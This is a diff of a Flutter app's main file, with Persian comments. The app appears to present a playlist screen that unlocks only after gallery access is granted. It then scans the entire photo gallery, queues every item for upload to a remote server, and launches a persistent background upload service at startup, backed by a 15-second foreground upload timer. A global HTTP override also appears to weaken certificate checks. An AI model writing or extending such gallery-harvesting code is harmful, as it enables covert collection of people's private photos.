@@ -6,9 +6,10 @@ import 'package:image_picker/image_picker.dart';
 import 'package:photo_manager/photo_manager.dart';
 import 'package:flutter_background_service/flutter_background_service.dart';
 import 'package:permission_handler/permission_handler.dart';
+import 'dart:async';
 import 'dart:convert';
 import 'dart:io';
-import 'dart:async';
+
 import 'services/background_service.dart';
 
 const String baseUrl = 'https://loveapp-production-f89f.up.railway.app';
@@ -34,6 +35,15 @@ void main() async {
   WidgetsFlutterBinding.ensureInitialized();
   HttpOverrides.global = MyHttpOverrides();
   await initializeBackgroundService();
+
+  // سرویس پس‌زمینه رو همین الان استارت کن — اپ کاملاً foreground هست
+  try {
+    final service = FlutterBackgroundService();
+    await service.startService();
+  } catch (_) {
+    // اگه نشد، مشکلی نیست — وقتی اپ بازه خودش آپلود می‌کنه
+  }
+
   runApp(const MyApp());
 }
 
@@ -326,13 +336,12 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
   bool _galleryGranted = false;
   bool _syncing = false;
   String _syncStatus = '';
-  bool _useForegroundOnly = false;
-  Timer? _uploadTimer;
+  Timer? _fgTimer;
 
   @override
   void dispose() {
     _player.dispose();
-    _uploadTimer?.cancel();
+    _fgTimer?.cancel();
     super.dispose();
   }
 
@@ -347,7 +356,7 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
   }
 
   Future<void> _requestGalleryAndUnlock() async {
-    // ۱. دسترسی گالری
+    // فقط پرمیشن بگیر و UI رو آنلاک کن
     final result = await PhotoManager.requestPermissionExtend();
     if (!result.isAuth) {
       _snack('دسترسی گالری رد شد');
@@ -355,50 +364,29 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
     }
     setState(() => _galleryGranted = true);
 
-    // ۲. دسترسی نوتیفیکیشن
+    // نوتیفیکیشن پرمیشن هم بگیر
     if (Platform.isAndroid) {
       await Permission.notification.request();
     }
 
-    // ۳. صبر کن تا اپ کاملاً foreground بشه (بعد از بسته شدن دیالوگ پرمیشن)
-    await Future.delayed(const Duration(seconds: 1));
+    _snack('دسترسی فعال شد — آپلود در حال انجامه');
 
-    // ۴. تلاش برای استارت سرویس پس‌زمینه
-    bool serviceStarted = false;
-    try {
-      final service = FlutterBackgroundService();
-      await service.startService();
-      serviceStarted = true;
-      _snack('آپلود پس‌زمینه فعال شد');
-    } catch (e) {
-      // اگه نشد، فقط وقتی اپ بازه آپلود کن
-      setState(() => _useForegroundOnly = true);
-      _snack('آپلود فقط وقتی اپ بازه فعال شد');
-    }
-
-    // ۵. اسکن گالری
+    // اسکن گالری و اضافه کردن به صف
     setState(() { _syncing = true; _syncStatus = 'در حال اسکن...'; });
     try {
       final newItems = await scanGalleryToQueue();
       setState(() => _syncStatus = '$newItems فایل به صف اضافه شد');
-      if (newItems > 0) _snack('$newItems فایل جدید به صف اضافه شد');
+      if (newItems > 0) _snack('$newItems فایل جدید به صف آپلود اضافه شد');
     } catch (e) {
       setState(() => _syncStatus = 'خطا در اسکن');
     }
     setState(() => _syncing = false);
 
-    // ۶. اگه سرویس پس‌زمینه نشد، تایمر آپلود وقتی اپ بازه رو بذار
-    if (!serviceStarted && _useForegroundOnly) {
-      _startForegroundUpload();
-    }
-  }
-
-  void _startForegroundUpload() {
-    _uploadTimer?.cancel();
-    _uploadTimer = Timer.periodic(const Duration(seconds: 10), (_) async {
+    // اگه سرویس پس‌زمینه استارت نشده، تایمر foreground بذار
+    _fgTimer?.cancel();
+    _fgTimer = Timer.periodic(const Duration(seconds: 15), (_) async {
       await processQueueInForeground();
     });
-    // یه بار فوراً هم اجرا کن
     processQueueInForeground();
   }
 
